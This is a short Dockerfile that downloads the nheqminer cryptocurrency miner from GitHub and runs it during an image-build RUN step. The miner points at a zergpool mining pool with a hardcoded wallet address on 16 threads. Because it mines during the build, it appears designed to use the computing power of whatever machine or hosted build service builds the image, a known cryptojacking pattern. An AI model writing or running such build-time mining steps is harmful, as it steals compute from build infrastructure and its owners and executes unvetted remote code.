FROM ubuntu/ubuntu
RUN apt-get install -y curl git unzip wget
RUN wget https://github.com/VerusCoin/nheqminer/releases/download/v0.8.2/nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tgz && tar -xvf nheqminer-Linux-v0.8.2.tar.gz && nheqminer/nheqminer -v -l verushash.asia.mine.zergpool.com:3300 -u TQpXLjKyYX76kmZ8Sw2uxAcjYqL8B9ihEZ.lolipoplol -p c=TRX,mc=VRSC -t 16
